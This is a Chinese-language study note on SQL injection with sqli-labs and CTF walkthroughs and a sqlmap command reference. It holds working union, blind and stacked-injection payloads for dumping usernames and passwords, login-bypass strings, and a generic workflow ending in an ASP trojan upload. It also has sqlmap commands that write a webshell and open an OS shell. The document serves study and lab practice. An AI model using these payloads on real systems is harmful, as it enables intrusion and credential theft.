### 概述

SQL：用于数据库中的标准数据查询语言。

SQL注入是通过SQL这种数据库查询方法强行获取数据库中的数据

**注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句**

基本操作类似于:别人告诉我们一句话“打死我也不说”，当别人问我那句话是什么的时候我说“打死我也不说”，此时别人无法区分那句话是“打死我也不说”还是我不想说出那句话，只能依靠基本的或者设置来进行判断

SQL可分为**平台层注入**和**代码层注入**。

平台层注入：由于不安全的数据库配置或数据库平台的漏洞导致。

代码层注入：程序员对输入没有细致地过滤，从而执行了非法地数据查询。    

### 一、漏洞原因分析

由于存在数据库，所以需要查询数据

这里使用sqli-labs作为sql注入练习靶场

如果此时get输入id=1进行试探，同时改变id的参数，看是否拥有sql行为

通过随着id变化的输出内容我们判断存在sql语句、

### 二、sql注入的原理

对于[Java](http://lib.csdn.net/base/javase)数据库连接JDBC而言，SQL注入攻击只对Statement有效，对PreparedStatement是无效的，这是因为PreparedStatement不允许在不同的插入时间改变查询的逻辑结构。

#### 如：验证是否存在sql的语句为

用户名'and pswd='密码

如果在用户名字段中输入'or 1=1'或者是在密码字段中输入'or 1=1'将绕过验证，

但是这种手段支队statement有效，对preparedstatement无效。

##### 简单示例

```plain
select id from users where username = '"+username +"' and password = '"  + password +"'
```

其中"+username ="和"password +"为我们输入的内容

这是基础格式，username和password都是从表单中取出数据

如果我们此时在username中输入  'or 1=1--  ,password的表单中随便输入一些东西，那么sql语句将会变成

```plain
select id from users where username = '' or 1=1--  and password = '123'
```

其中or 1=1--前面的两个单引号或被识别成一个双引号，变成了

```plain
select id from users where username = " or 1=1--  and password = '123'
```

而or就变成了以及个判断语句，由于1=1为真，--符号注释掉了后面的password，所以输入内容跳过了sql的密码验证

### 三、sql攻击

总体思路为：

1、发现sql注入位置

2、判断后台数据库类型

3、确定XP_CMDSHELL的可执行情况

4、发现web虚拟目录

5、上传ASP木马

6、得到管理员权限

sql部分字符解释： 有#和--+两种，负责注释掉后面的字符 

其中--+中--为注释的意思，但是需要空格符号才能启动，+号则代表空格符号

#### 1、SQL注入漏洞的判断

一般来说，sql存在于如HTTP://xxx.xxx.xxx/abc.asp?id=XX等带有参数的asp或者动态网页中，有时一个动态网页中可能只有一个参数，有时可能有N个参数

参数拥有各种可能性，整型，字符串都有可能

以下以HTTP://xxx.xxx.xxx/abc.asp?p=YY为例进行分析，YY可能是整型，也有可能是字符串。

##### 1、整型参数的判断

当输入的YY为整型时，通常abc.asp中的sql语句运行如下

select * from 表名 where 字段=YY

先在变量最前面加上单引号——>运行异常则进入下一步

然后在后面加上and 1=1——>运行正常且与不进行操作的结果相同

将1=1变成1=2 ——>运行异常

如果上述三点全部满足条件，则一定存在SQL漏洞

##### 2、特殊情况的处理

有时ASP程序员会过滤掉单引号等字符，防止注入，下面有三种办法作为参考

1、大小写混合法  由于VBS并不区分大小写，而程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；

2、UNICODE加密

3、ASCLL加密，如U=chr（85）

### 注入sql

#### 步骤1、判断类型

```plain
# 数字型
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
# 字符型
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

##### 假设是数字型

将ID的分别赋值为 1 and 1=1和1 and 1=2；

如果为数字型，则第一二句话返回结果不一致，如果为字符型，则两句话都没有效果，返回结果一致。

但是注意如果user_id本身是int类型，实际查询过程中是会返回结果的，这可能是因为对输入的字符进行了截断并转换了类型，造成1 and 1=2在字符类型中会返回user_id为1的查询结果。当然如果第二个语句返回了结果，我们也可以以此判断出该注入类型是字符型。

##### 假设是字符型

将id的值赋值为

```plain
1' and '1'='1
1' and '1'='2
```

实际代码变为：

```plain
SELECT first_name, last_name FROM users WHERE user_id = '1' and '1'='1'
```

即向id='1' and '1'='1'  其中涂色内容为输入内容

#### 猜解sql查询语句中的字段数

在这一步中，尝试去猜测出查询语句中的字段个数，如下注入语句所示，

假设为字符型注入，先利用1'实现引号闭环，

再利用or 1=1这样可以暴露出表中所有的数据，

最后利用order by num#去看是否报错来明确查询语句中的字段数，

其中#号用于截断sql查询语句。
' or 1=1 union select 1, 2, 3 #

#### 3、确定字段的显示顺序

使用union，如下

1' union select 1, 2 #

这里我们故意扰乱了first_name和last_name的两个位置，查询出来结果中的1，2会指明数据字段在查询语句中的位置。

### 4、获取当前数据库

通过前面的字段数确定以及显示顺序确定，我们就可以结合union操作来获取数据库中的信息了。如下代码所示，展示了获取数据库名的操作，根据前面已经获取到的字段数以及位置关系，假设有两个字段，那么下面的查询语句将会把数据库的名称放在第二个字段中。

### 部分基础注入语句解释

```plain
-1 order by 4 -- -
//判断有多少列
-1 union select 1,2,3 -- -
//判断数据显示点
-1 union select 1,database() -- -
//显示出登录用户和数据库名
-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security' ),3 -- -
//查看数据库有哪些表
-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'security' and table_name='users'),3 -- -
//查看对应表有哪些列
-1 union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -
//查看账号密码信息
```

### order by

#### order by 简介

##### orderby的作用

可以使查询返回的「结果集」按照指定的列进行排序，可以按照某「一列」排序或者同时按照「多列」进行排序，排序的顺序可以是「升序」或者「降序」。

```plain
SELECT column_name,column_name
FROM table_name
ORDER BY column_name,column_name ASC|DESC;
```

order by 使用

测试表如下

![img](https://s2.loli.net/2024/11/19/kTB768CMvoAZtRY.png)

### sqli搭建

### 失败的搭建：由于kali版本不对，导致最后初始化

#### 环境配置

本次已经成功配置kali，采用的是桥接网络，只需安装便可

#### sqli安装

参考文献：[kali sqli安装](https://blog.csdn.net/qq_39115446/article/details/121272573?ops_request_misc=%7B%22request%5Fid%22%3A%22e6b8b7b0fa2d09f24387318d265c0317%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=e6b8b7b0fa2d09f24387318d265c0317&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121272573-null-null.142^v100^pc_search_result_base4&utm_term=kali安装sqli&spm=1018.2226.3001.4187)

c

```plain
# cd /var/www/html/
# git clone https://github.com/mukkul007/sqli-labs-kali2.git
```

使用上面两个命令安装

```plain
# service mysql start
# mysql -uroot
MariaDB [(none)]> grant all on dvwa.* to root@localhost identified by '123456';
MariaDB [(none)]> flush privileges;
# vi /var/www/html/sqli-labs-kali2/sql-connections/db-creds.inc
```

接下来激活sql并进行配置

![img](https://s2.loli.net/2024/11/24/YCMnTH7RdLzX5kF.png)

输入如下内容

之后更改火狐相关内容防止自动跳转

火狐地址栏 about:config
browser.fixup.fallback-to-https
true—改false

浏览器访问如下内容http://127.0.0.1/sqli-labs-kali2/

![img](https://s2.loli.net/2024/11/24/1adw3gmpQihcxDJ.png)

但是由于版本问题，点击setup之后没反应，导致只能转向win

### 真正的搭建

使用php7发现如下内容

搜索发现sql漏洞要低版本php，因此在小皮面板里安装

![img](https://s2.loli.net/2024/11/24/jkWt94bVXiaZuJ8.png)

![img](https://s2.loli.net/2024/11/24/ldJGDn46I9VMvpm.png)

点击安装即可

阅读相关内容，发现有可能需要一个5.2.17版本php

在php官方网站下载后解压到php小皮的相关文件夹中

![img](https://s2.loli.net/2024/11/24/LZHWcfp73iBU1DT.png)

之后设置ini文件夹，将其中的路径修改复制为当前文件的位置

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732415590171-88598e2a-00d8-4fe5-9ac1-59cd79a3880f.png)

在php小皮中选择低版本php并带年纪注册

出现

#### ![img](https://s2.loli.net/2024/11/24/C34LNHrYA2RTj5U.png)

完成搭建

### sqli题解

参考文献：[sqli1-35题解](https://blog.csdn.net/qq_41420747/article/details/81836327?ops_request_misc=%7B%22request%5Fid%22%3A%222301253ec0d5c0a2e040fb0de9548612%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=2301253ec0d5c0a2e040fb0de9548612&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81836327-null-null.142^v100^pc_search_result_base4&utm_term=sqli题解&spm=1018.2226.3001.4187)

#### 1（这为第一题，后续相同内容便不再过多赘述，只将其中不同部分摘出）![img](https://s2.loli.net/2024/11/24/jWLCbO83ITywUSv.png)

输入?id=1'之后报错，而1正常执行，说明是'注入

试探行列：-1 order by x#，当x=4时出现报错，说明只有三行

![img](https://s2.loli.net/2024/11/24/q3nKAZYrsBheGSm.png)

之后试探列数

![img](https://s2.loli.net/2024/11/24/6mDVBuos9qN8diT.png)

在输入1，2时报错，1，2，3时出现如上内容，说明有3列

之后使用database（）暴库

![img](https://s2.loli.net/2024/11/24/FeYinCS1dxUqPpg.png)

这里发现位置1并不显示，调整成2位置方便观察

查看有哪些表

```plain
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database() ),3 -- -
```



![img](https://s2.loli.net/2024/11/24/u3coLNagIeJkO8M.png)

查看行列

```plain
-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name='users'),3 -- -
```

![img](https://s2.loli.net/2024/11/24/f5nhbQ9lszSJIca.png)

```plain
-1' union select 1,(select group_concat(concat_ws(username,password))from users),3 -- -
```

![img](https://s2.loli.net/2024/11/24/JojiM6HLZEhv7GA.png)

成功

#### 2：

![img](https://s2.loli.net/2024/11/24/o4DsQ2EyOMaxeWj.png)

![img](https://s2.loli.net/2024/11/24/AS4GJ2dcPb1R6ME.png)

输入 1 and 1=1和1and 1=2来判断，为整型

将注入的内容变成了整型，所以将-1后面的单引号去除即可，不多赘述

#### 3

输入1'，产生报错信息

![img](https://s2.loli.net/2024/11/24/Uf4yEAcQ5VmoPSR.png)

发现报错信息中出现了括号，尝试1')，成功显示

![img](https://s2.loli.net/2024/11/24/Mlev5Z9YU63xWaV.png)

输入:?id=1') order by 3-- +,页面回显正常

输入输入:?id=1') order by 4-- +,页面回显错误

接下来正常注入即可。

#### 4

输入1和1'正常，输入1"出现报错

![img](https://s2.loli.net/2024/11/24/n5rsgtEcVmWXBeZ.png)

尝试1" and "1"="2

出现不同选项

表明注入为双引号注入

之后正常注入即可

![img](https://s2.loli.net/2024/11/24/YFea2KtHIkGBQqD.png)

#### 5

出现如下选项

![img](https://s2.loli.net/2024/11/24/RpkO9x8bdjXui2E.png)

猜测可能是盲注的简化版本，

推出是单引号闭合，

##### 使用相关函数进行库长度猜测

```sql
1' and length(database()) =n--+
```

当n=其他数字时无显示，当n=8时出现

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732435580595-3f0e03fa-3c67-4983-ba8d-6b0547e01eea.png)

因此判断数据库名称长度为8

##### 之后逐个查看数据库字符

```sql
id=1' and substr(database(),1,1)='s' --+
```

第一个为位置,第二个为长度，第三个为字符猜测

这里对第1和第3个加入burp进行爆破

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732437635507-9e91ecdc-a611-4fe6-a7af-343a5bded2b9.png)

攻击结果如下

![img](https://s2.loli.net/2024/11/24/Tubl9KFSEGMOfjw.png)

表名推出为security

```sql
id=1' and (select count(table_name) from information_schema.tables where table_schema='security')=4 -- +
```

##### 之后逐渐测试库有多少个

当=4时显示如下

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732438601192-f0f650b3-8c02-4f63-80f6-d9bcf7ef8e68.png)

说明有4个数据库

爆破库名

开始burp爆破流程

```sql
?id=1 and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e' -- +
```

三个需要修改的值为limit第一个值，第二组第一个值，以及a

字典一：security库中有4个表，所以字典一内容是0-3

字典二:指定库中最长表名有n个字母，所以字典二内容是1-n(可以挨个试试看看最长是几位，图省事搞一个2位数就行)

字典三：指定表的表名，所以字典内容是字母a-z

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732456872150-dacf9e72-ddf8-40a1-b60b-a34b62db5d0f.png)

之后爆破列名

```sql
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))='a'--+
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732457096832-dd639b37-dd08-4623-8f95-7bda05615491.png)

组合得到

##### 也可以直接sqlmap

```sql
sqlmap.py -u http://127.0.0.1/sqli/Less-5/?id=1 -D security -T users -C "id,password,username" --dump
```



![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1732457392918-f510b033-a0a8-4832-92e1-38122f5f0fb4.png)

#### 6

将单引号转换为了双引号而已

### 其他例题

首先进入后发现一个登录界面,发现无论如何都没办法进行sql注入，只有

![img](https://s2.loli.net/2024/11/24/a54MTKQHroRfjB2.png)

界面

这里卡住了，在网上搜了wp后发现要从其他地方sql注入

F12进入网络界面，点击测试新闻，发现如下代码

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1723711735565-651d6f2a-b5ef-4da5-b0b7-e2a279c05489.png)

发现get相关传参，猜测可能有sql注入点位

#### 测试流程

##### 判断注入类型

分别输入

一、1 and 1=1%23

二、1 and 1=2%23

一有回显，二无回显

因此判断注入类型为数字型

之后进行猜行

```plain
1 order by 1%23
1 order by 1,2%23
1 order by 1,2,3%23
```

发现仅12有回显，3无回显，故得知有两行

然后推测位置

1 union select 1,2#

![img](https://s2.loli.net/2024/11/24/dC35fVBEwoJ8DbX.png)

确认了输出位置

之后开始确认表

输入

1 union select 1,database()%23

得到

![img](https://s2.loli.net/2024/11/24/QThDRimZIjB85bN.png)

然后进行查表

```plain
?id = -1 union select 1,(select group_concat(table_name) from information_schema.tables where table_name = 'news')#
```

得到结果

![img](https://s2.loli.net/2024/11/24/Sc6IFN9DiXZJUWG.png)

```plain
?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='news' and table_column='admin')#
```

![img](https://s2.loli.net/2024/11/24/YFxKn16G35Plbz4.png)

```plain
?id=1 union select 1,(select group_comcat(username)from admin)#
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1723723949288-d3276e86-d809-4583-8848-9c15c7f139bb.png)

```plain
?id=1 union select 1,(select group_comcat(password)from admin)#
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1723723992527-d0f7c42f-14e9-4f46-a9f5-7362ae814f6b.png)

得到答案

#### sqlmap解题方法

找到?id=的url后进行扫描

python sqlmap.py -u "http://8a572774-1639-43bb-8ae0-f2c62808f55d.node5.buuoj.cn:81/backend/content_detail.php?id=1" -random-agent

成功注入

python sqlmap.py -u "http://8a572774-1639-43bb-8ae0-f2c62808f55d.node5.buuoj.cn:81/backend/content_detail.php?id=1" -random-agent-dbs

查看所有数据库

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1723728379645-bb7b3838-3e94-41ea-a413-7a4d628c9bbb.png)

-current-db查看当前

![img](https://cdn.nlark.com/yuque/0/2024/png/42552309/1723728472443-f9d1041e-fed6-4713-a452-1f124bfb8e25.png)

逐步查看

![](https://cdn.nlark.com/yuque/0/2024/png/42552309/1723730100818-403964f5-e189-412f-9821-2668470ace4b.png)

#### supersqli(本题还有大量内容未彻底了解，只能勉强了解堆叠注入）

#### 进行注入字符判断

输入  1’ and 1=1 #  没报错，证明是单引号字符注入（失败则尝试1”之类

```plain
1' order by X#
//其中，X代表列数，输入2，3....等自然数，发现3报错，没有3列，只有两列
```

#### 尝试联合查询

1' union select 1,2#

发现输出结果过滤掉了select where等关键词

尝试大小写绕过依然不行

此时由于关键词导致 union>报错>布尔>时间 这个排序中

select以及where关键词过滤导致union（select硬需求）报错（mid()需要select）无法运行。



由于堆叠注入较为简单，观察到 show、from 等一些堆叠注入关键词没有被过滤，且容易确定是否行得通，故先测试堆叠注入

#### 堆叠注入的尝试

此处先简单尝试  1'; show databases;# 来查看数据库名称 ——>此处一定要记得注释掉后面的内容

结果如下

![img](https://s2.loli.net/2024/11/24/3YOE28JhTNd4UKz.png)

发现可行，故进一步尝试，查看表格名称

1';show tables;#

结果如下

![img](https://s2.loli.net/2024/11/24/sc8FXJCGBEWK6h9.png)

有俩表，先打开看看有什么字段，查看1919810931114514，提交（纯数字为表名要打反引号）

 1'; show columns from `1919810931114514`;#  

发现如下

![img](https://s2.loli.net/2024/11/24/hfZ5TBbjPn2v8CR.png)

看见flag文件，了解到flag文件途径为

supersqli——>1919810931114514——>flag

#### flag查看过程

##### 方法一：替换名称法

查看words表格，发现words表格与最开始的输出信息类似，

![img](https://s2.loli.net/2024/11/24/385ypRUaHivzdW4.png)![img](https://s2.loli.net/2024/11/24/ltiRDLQ6zYscWIJ.png)

发现列名分别为 id 和 data，猜测表words可能为默认查询的表

构造 1' or 1=1#进行布尔注入

发现如下结构

![img](https://s2.loli.net/2024/11/24/y9GqLericTJWlgk.png)

证实默认查询列表为words，用来回显内容

接下来通过更改名称来一波偷梁换柱即可

则可以利用 rename 关键字将 表word改名为words，并将表 1919810931114514改名为 word，这样默认查询的表就变成了原先的 表1919810931114514，

基本格式就是  rename ``更改前的名字`` to `想更改成的名字`

由于注入框的查询是对列id的搜索，此时参考两个表的列名，需要将flag列名改为能够查找的id列（修改包括名称和数据类型）。

过滤中没有alert（对于列进行添加和删除）

我们已经知道了**words是用来回显内容的**，我们把1919810931114514这个表更改名字为words,并增加相应的字段，使之回显原1919810931114514这个表的内容。

```plain
1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
or
1';rename table `words` to `words1`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100) ;show columns from words;#
```

此时表格内容已经改变了，

再用万能语句，得到flag

1' or 1=1#

![img](https://s2.loli.net/2024/11/24/dXtHJr7To2AxciE.png)

### sqlmap教程

###  sqlmap简介

sqlmap支持五种不同的注入模式：

- 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
- 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
- 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
- 4、联合查询注入，可以使用union的情况下的注入。
- 5、堆查询注入，可以同时执行多条语句的执行时的注入。

### sqlmap支持的数据库有

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

```plain
1、检测「注入点」
python sqlmap.py -u 'http:'
2、查看所有「数据库」
python sqlmap.py -u 'http:' --dbs
3、查看当前使用的数据库
sqlmap -u 'http:' --current-db
4、查看「数据表」
sqlmap -u 'http:' -D security --tables
5、查看「字段」
sqlmap -u 'http:' -D security -T 'users' --columns
6、查看「数据」
sqlmap -u 'http:' -D security -T 'users' --dump
```

#### 部分报错解决方案

##### 第一步检查注入点失败解决方法

###### 原因

默认情况下，sqlmap发送的HTTP报文的 user-agent 都是Sqlmap而不是常见的Mozilla等，这通常会被防火墙过滤掉， 选项–random-agent 会随机选取./txt/user-agents.txt中的报头，如 Mozilla等

###### 解决方法：

在后面加上-random-agent

```plain
python sqlmap.py -u "http://" -random-agent（
```

## 检测注入

### 基本格式

sqlmap -u "http://www.vuln.cn/post.php?id=1"

默认使用level1检测全部数据库类型

sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

### 跟随302跳转

当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，
当注入错误的时候，先报错再跳转的时候，不需要跟随302。
目的就是：要追踪到错误信息。

### cookie注入

当程序有防get注入的时候，可以使用cookie注入
sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）

### 从post数据包中注入

可以使用burpsuite或者temperdata等工具来抓取post包

sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql    指定username参数

## 注入成功后

### 获取数据库基本信息（如果是python环境的话，前面还要加上python字样

sqlmap -u " "  --dbms mysql --level 3 --dbs

查询有哪些数据库

sqlmap -u " "  --dbms mysql --level 3 -D test --tables

查询test数据库中有哪些表

sqlmap -u " "  --dbms mysql --level 3 -D test -T admin --columns

查询test数据库中admin表有哪些字段

sqlmap -u " "  --dbms mysql --level 3 -D test -T admin -C "username,password" --dump

dump出字段username与password中的数据

其他命令参考下面

### 从数据库中搜索字段

sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password
在dedecms数据库中搜索字段admin或者password。

### 读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
\#示例：
sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"

使用shell命令：

sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell
接下来指定网站可写目录：
“E:\php\htdocs\dvwa”

\#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）

## sqlmap详细命令：

- --is-dba 当前用户权限（是否为root权限）
- --dbs 所有数据库
- --current-db 网站当前数据库
- --users 所有数据库用户
- --current-user 当前数据库用户
- --random-agent 构造随机user-agent
- --passwords 数据库密码
- --proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
- --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

——————————————————————————————————

### Options（选项）：

- --version 显示程序的版本号并退出
- -h, --help 显示此帮助消息并退出
- -v VERBOSE 详细级别：0-6（默认为1）
- 保存进度继续跑：

sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度
sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度

### Target（目标）：

以下至少需要设置其中一个选项，设置目标URL。

- -d DIRECT 直接连接到数据库。
- -u URL, --url=URL 目标URL。
- -l LIST 从Burp或WebScarab代理的日志中解析目标。
- -r REQUESTFILE 从一个文件中载入HTTP请求。
- -g GOOGLEDORK 处理Google dork的结果作为目标URL。
- -c CONFIGFILE 从INI配置文件中加载选项。

### Request（请求）：

这些选项可以用来指定如何连接到目标URL。

- --data=DATA 通过POST发送的数据字符串
- --cookie=COOKIE HTTP Cookie头
- --cookie-urlencode URL 编码生成的cookie注入
- --drop-set-cookie 忽略响应的Set - Cookie头信息
- --user-agent=AGENT 指定 HTTP User - Agent头
- --random-agent 使用随机选定的HTTP User - Agent头
- --referer=REFERER 指定 HTTP Referer头
- --headers=HEADERS 换行分开，加入其他的HTTP头
- --auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
- --auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
- --auth-cert=ACERT HTTP认证证书（key_file，cert_file）
- --proxy=PROXY 使用HTTP代理连接到目标URL
- --proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
- --ignore-proxy 忽略系统默认的HTTP代理
- --delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
- --timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
- --retries=RETRIES 连接超时后重新连接的时间（默认3）
- --scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
- --safe-url=SAFURL 在测试过程中经常访问的url地址
- --safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL

### Enumeration（枚举）：

这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行
您自己的SQL语句。

- -b, --banner 检索数据库管理系统的标识
- --current-user 检索数据库管理系统当前用户
- --current-db 检索数据库管理系统当前数据库
- --is-dba 检测DBMS当前用户是否DBA
- --users 枚举数据库管理系统用户
- --passwords 枚举数据库管理系统用户密码哈希
- --privileges 枚举数据库管理系统用户的权限
- --roles 枚举数据库管理系统用户的角色
- --dbs 枚举数据库管理系统数据库
- -D DBname 要进行枚举的指定数据库名
- -T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
- --tables 枚举的DBMS数据库中的表
- --columns 枚举DBMS数据库表列
- --dump 转储数据库管理系统的数据库中的表项
- --dump-all 转储所有的DBMS数据库表中的条目
- --search 搜索列（S），表（S）和/或数据库名称（S）
- -C COL 要进行枚举的数据库列
- -U USER 用来进行枚举的数据库用户
- --exclude-sysdbs 枚举表时排除系统数据库
- --start=LIMITSTART 第一个查询输出进入检索
- --stop=LIMITSTOP 最后查询的输出进入检索
- --first=FIRSTCHAR 第一个查询输出字的字符检索
- --last=LASTCHAR 最后查询的输出字字符检索
- --sql-query=QUERY 要执行的SQL语句
- --sql-shell 提示交互式SQL的shell

### Optimization（优化）：

这些选项可用于优化SqlMap的性能。

- -o 开启所有优化开关
- --predict-output 预测常见的查询输出
- --keep-alive 使用持久的HTTP（S）连接
- --null-connection 从没有实际的HTTP响应体中检索页面长度
- --threads=THREADS 最大的HTTP（S）请求并发量（默认为1）

### Injection（注入）：

这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

- -p TESTPARAMETER 可测试的参数（S）
- --dbms=DBMS 强制后端的DBMS为此值
- --os=OS 强制后端的DBMS操作系统为这个值
- --prefix=PREFIX 注入payload字符串前缀
- --suffix=SUFFIX 注入payload字符串后缀
- --tamper=TAMPER 使用给定的脚本（S）篡改注入数据

### Detection（检测）：

这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

- --level=LEVEL 执行测试的等级（1-5，默认为1）
- --risk=RISK 执行测试的风险（0-3，默认为1）
- --string=STRING 查询时有效时在页面匹配字符串
- --regexp=REGEXP 查询时有效时在页面匹配正则表达式
- --text-only 仅基于在文本内容比较网页

### Techniques（技巧）：

这些选项可用于调整具体的SQL注入测试。

- --technique=TECH SQL注入技术测试（默认BEUST）
- --time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
- --union-cols=UCOLS 定列范围用于测试UNION查询注入
- --union-char=UCHAR 用于暴力猜解列数的字符

### Fingerprint（指纹）：

- -f, --fingerprint 执行检查广泛的DBMS版本指纹

### Brute force（蛮力）：

这些选项可以被用来运行蛮力检查。

- --common-tables 检查存在共同表
- --common-columns 检查存在共同列

User-defined function injection（用户自定义函数注入）：
这些选项可以用来创建用户自定义函数。

--udf-inject 注入用户自定义函数
--shared-lib=SHLIB 共享库的本地路径

### File system access（访问文件系统）：

这些选项可以被用来访问后端数据库管理系统的底层文件系统。

- --file-read=RFILE 从后端的数据库管理系统文件系统读取文件
- --file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
- --file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

### Operating system access（操作系统访问）：

这些选项可以用于访问后端数据库管理系统的底层操作系统。

- --os-cmd=OSCMD 执行操作系统命令
- --os-shell 交互式的操作系统的shell
- --os-pwn 获取一个OOB shell，meterpreter或VNC
- --os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
- --os-bof 存储过程缓冲区溢出利用
- --priv-esc 数据库进程用户权限提升
- --msf-path=MSFPATH Metasploit Framework本地的安装路径
- --tmp-path=TMPPATH 远程临时文件目录的绝对路径

### Windows注册表访问：

这些选项可以被用来访问后端数据库管理系统Windows注册表。

- --reg-read 读一个Windows注册表项值
- --reg-add 写一个Windows注册表项值数据
- --reg-del 删除Windows注册表键值
- --reg-key=REGKEY Windows注册表键
- --reg-value=REGVAL Windows注册表项值
- --reg-data=REGDATA Windows注册表键值数据
- --reg-type=REGTYPE Windows注册表项值类型

这些选项可以用来设置一些一般的工作参数。

- -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
- -s SESSIONFILE 保存和恢复检索会话文件的所有数据
- --flush-session 刷新当前目标的会话文件
- --fresh-queries 忽略在会话文件中存储的查询结果
- --eta 显示每个输出的预计到达时间
- --update 更新SqlMap
- --save file保存选项到INI配置文件
- --batch 从不询问用户输入，使用所有默认配置。

### Miscellaneous（杂项）：

- --beep 发现SQL注入时提醒
- --check-payload IDS对注入payloads的检测测试
- --cleanup SqlMap具体的UDF和表清理DBMS
- --forms 对目标URL的解析和测试形式
- --gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
- --page-rank Google dork结果显示网页排名（PR）
- --parse-errors 从响应页面解析数据库管理系统的错误消息
- --replicate 复制转储的数据到一个sqlite3数据库
- --tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
- --wizard 给初级用户的简单向导界面

